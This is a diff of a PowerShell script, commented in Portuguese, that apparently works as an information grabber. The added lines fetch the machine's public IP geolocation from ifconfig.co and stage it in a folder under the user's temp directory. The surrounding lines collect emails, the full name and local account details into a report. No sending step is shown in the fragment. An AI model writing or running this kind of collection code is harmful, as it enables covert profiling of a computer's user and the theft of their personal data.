@@ -133,21 +133,22 @@ Write-Output "Emails encontrados: $email"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 #Geo-Localização
+# Obtem as informações de localização
+$location = Invoke-RestMethod -Uri 'http://ifconfig.co/json' -Method Get
 
-# Definir a URL do serviço de geolocalização
+# Cria um ficheiro chamado Location.txt na pasta C:\Users\Escola\3D Objects
+$location | ConvertTo-Json | Out-File -FilePath "$env:USERPROFILE\AppData\Local\Temp\Location.txt"
 
+# Criar Pasta
+New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\Location"
 
-# Fazer uma solicitação web para obter os dados de geolocalização
-
-
-# Exibir os dados de geolocalização
-$location
+# Move para o sitio certo
+Move-Item -Path "$env:USERPROFILE\AppData\Local\Temp\Location.txt" -Destination "$env:TEMP\$FolderName\Location\Location.txt"
 
 
 
 ############################################################################################################################################################
-
-# local-user
+# Nome do utilizador local
 
 $luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String 
 
@@ -336,10 +337,6 @@ $output = @"
 Nome Completo: $fullName
 
 Emails: $email
-
-Geolocalização: $location
-Latitude:  $Lat 
-Longitude: $Lon
 
 ------------------------------------------------------------------------------------------------------------------------------
 
